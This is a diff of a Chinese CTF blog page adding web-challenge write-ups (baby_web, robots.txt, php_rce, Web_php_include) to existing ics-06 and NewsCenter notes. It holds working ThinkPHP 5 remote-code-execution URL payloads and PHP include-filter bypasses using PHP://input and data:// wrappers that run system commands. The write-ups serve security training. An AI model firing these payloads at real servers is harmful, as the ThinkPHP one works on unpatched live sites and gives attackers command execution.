@@ -6,9 +6,9 @@
     <meta charset="utf-8">
     <meta name="keywords" content="攻防世界-web, 简简,简简博客,简简的博客,信息安全,CTF,渗透测试,Web,网络安全">
     <meta name="description" content="
-ics-06题目信息知识点：爆破id工具：Burpsuite
-解析打开题目场景，点击页面里的按钮，只有报表中心的页面可以打开，看到URL中的”index.php?id=1”,就开始尝试注入，但是除了数字其他的都不能用。尝试抓包，爆破id
-">
+baby_web题目提示想想初始页面是那个，一般初始页面都是index.php，直接访问index.php会重定向到1.php，直接抓包查看，在响应包中发现flag
+
+Training-WWW-Robots直接访问robots.txt，得">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -520,21 +520,21 @@ ics-06题目信息知识点：爆破id工具：Burpsuite
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-04-02
+                    2020-07-29
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2.8k
+                    3.1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    11 分
+                    13 分
                 </div>
                 
 				
@@ -551,7 +551,37 @@ ics-06题目信息知识点：爆破id工具：Burpsuite
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <p><img src="https://i.loli.net/2019/07/03/5d1c213fa0cd670760.png" alt></p>
-<h2 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h2><p><strong>题目信息</strong><br><img src="https://i.loli.net/2019/07/03/5d1c20f6e90f917897.png" alt><br><strong>知识点：爆破id</strong><br><strong>工具：Burpsuite</strong></p>
+<h2 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a>baby_web</h2><p>题目提示想想初始页面是那个，一般初始页面都是index.php，直接访问index.php会重定向到1.php，直接抓包查看，在响应包中发现flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200729184057.png" alt></p>
+<h2 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h2><p>直接访问robots.txt，得到/fl0g.php，直接访问该文件得到flag</p>
+<h2 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h2><p><strong>知识点：ThinkPHP V5 rce</strong></p>
+<p>打开页面显示是ThinkPHP V5框架，百度搜索相关漏洞<a href="https://blog.csdn.net/qq_40884727/article/details/101452478" target="_blank" rel="noopener">ThinkPHP5.x rce 漏洞分析与复现</a>，看完文章做这道题就很简单了</p>
+<p><strong>Payload:</strong></p>
+<pre><code>显示根目录下文件
+?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls /
+
+查看根目录下flag文件
+?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag
+
+flag{thinkphp5_rce}</code></pre><h2 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h2><p><strong>知识点：php伪协议</strong></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'hello'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$page</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> "php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//")) {</span>
+    <span class="token variable">$page</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span>"php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//", "", $page);</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>从代码中得知page中带有<code>php://</code>的都会被替换成空，可以使用大小写<code>PHP://</code>或者<code>data://伪协议</code>进行绕过</p>
+<p><strong>解题思路：</strong></p>
+<p>1、使用PHP://input进行执行php代码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200729191122.png" alt></p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200729190211.png" alt></p>
+<p>2、使用data://伪协议</p>
+<pre><code>?page=data:text/plain,&lt;?php system(ls);?&gt;
+
+?page=data:text/plain,&lt;?php system(cat fl4gisisish3r3.php);?&gt;  (执行完后flag在控制台源码中)</code></pre><h2 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h2><p><strong>题目信息</strong><br><img src="https://i.loli.net/2019/07/03/5d1c20f6e90f917897.png" alt><br><strong>知识点：爆破id</strong><br><strong>工具：Burpsuite</strong></p>
 <p><strong>解析</strong><br>打开题目场景，点击页面里的按钮，只有报表中心的页面可以打开，看到URL中的”index.php?id=1”,就开始尝试注入，但是除了数字其他的都不能用。<br>尝试抓包，爆破id</p>
 <p><img src="https://i.loli.net/2019/07/03/5d1c4dc3bb5ca75203.png" alt><br><img src="https://i.loli.net/2019/07/03/5d1c4e097bb6011944.png" alt><br>将抓到的包send to intruder<br><img src="https://i.loli.net/2019/07/03/5d1c4e430a8c575639.png" alt><br>导入字典后，还是爆破<br><img src="https://i.loli.net/2019/07/03/5d1c4e7ada66613178.png" alt><br>得到结果当id=2333是得到flag<br><img src="https://i.loli.net/2019/07/03/5d1c4ea3537df96893.png" alt></p>
 <h2 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h2><p><strong>题目信息</strong><br><img src="https://i.loli.net/2019/07/03/5d1c4f6c35c0451682.png" alt><br><strong>工具：bp,SQLmap</strong><br><strong>知识点：sql注入之post注入</strong></p>
@@ -1515,7 +1545,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">171k</span>&nbsp;字
+                class="white-color">172k</span>&nbsp;字
             
             
             
